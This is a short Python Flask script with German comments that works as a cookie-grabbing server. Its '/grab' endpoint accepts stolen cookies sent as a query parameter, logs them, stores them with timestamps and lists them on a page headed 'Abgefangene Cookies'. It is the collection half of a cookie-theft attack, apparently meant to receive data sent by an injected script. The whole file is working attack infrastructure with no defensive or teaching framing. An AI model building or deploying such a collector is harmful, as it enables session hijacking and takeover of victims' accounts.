#Requirements: pip install flask

from flask import Flask, request, render_template_string
from datetime import datetime


app = Flask(__name__)
# Speicher für die Cookies
captured_data = []

# HTML Template für die Ansicht
HTML_PAGE = """
<html><body>
    <h1>Abgefangene Cookies</h1>
    <table border="1">
        <tr><th>Zeitstempel</th><th>Cookies</th></tr>
        {% for entry in data %}
        <tr><td>{{ entry.time }}</td><td>{{ entry.cookies }}</td></tr>
        {% endfor %}
    </table>
</body></html>
"""

# Dieser Endpoint empfängt die Daten
@app.route('/grab')
def grab():
    cookies = request.args.get('c')
    print(f"DEBUG: Empfangene Daten: {cookies}")
    if cookies:
        captured_data.append({
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'cookies': cookies
        })
    return "OK", 200

# Hier siehst du die Ergebnisse
@app.route('/')
def index():
    return render_template_string(HTML_PAGE, data=captured_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
